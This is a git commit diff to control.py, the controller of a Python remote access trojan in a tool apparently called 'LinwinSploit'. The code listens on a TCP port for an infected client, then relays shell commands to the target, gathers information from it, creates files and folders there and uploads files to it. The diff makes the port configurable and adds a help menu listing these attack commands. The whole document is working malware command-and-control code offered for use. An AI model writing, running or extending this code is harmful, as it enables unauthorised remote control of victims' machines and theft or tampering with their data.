ffd504c281e50cce235bb6d0a637b086bc31bf1f
LinWin-Cloud <2382546858@qq.com>
2023-04-02 13:49:51 +0800

    control.py

--- Module/program/python/trojan_virus/control.py
+++ Module/program/python/trojan_virus/control.py
@@ -1,9 +1,22 @@
 import socket
 import os
+import sys
+
+HELP = """
+|_LinwinSploit Python trojan_virus_|
+
+1. shell                Send shell command to target.
+2. exit                 Exit from this attack.
+3. getinfo              Get information from target.
+4. mkdir [dir path]     Make a new dictionary.
+5. touch [file path]    Create a new File.
+6. upload [local file]  Upload a local file to the target host.
+
+"""
 
 print(" [INFO] WAIT FOR THE CLIENT CONNECT......")
 tcpserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-tcpserver.bind(("", 8888))
+tcpserver.bind(("", int(sys.argv[1])))
 tcpserver.listen(5)
 while True:
     conn, addr = tcpserver.accept()
@@ -11,19 +24,22 @@ while True:
     print(" Enter 'help' to get help information.")
     while True:
         try:
-
+            ret = conn.recv(1024)
+            client_message = ret.decode("utf-8")
+            print(client_message)
             command = input("LinwinSploit> ").strip()
 
             if command == 'exit':
                 conn.send(command.encode())
                 conn.close()
+                tcpserver.close()
                 exit(0)
             if command == 'help':
-                runPath = os.path.abspath(os.path.dirname(__file__))
-                o = open(runPath+"/Help.txt")
-                print(o.read())
+                conn.send("none".encode())
+                print(HELP)
                 continue
             if command == 'shell':
+                print(" Enter 'exit' to exit")
                 while True:
                     try:
                         shell_command = input("LinwinSploit [Shell] $ ")
@@ -37,9 +53,7 @@ while True:
                         continue
             else:
                 conn.send(command.encode())
-                ret = conn.recv(1024)
-                client_message = ret.decode("utf-8")
-                print(client_message)
+                continue
 
         except Exception:
             break
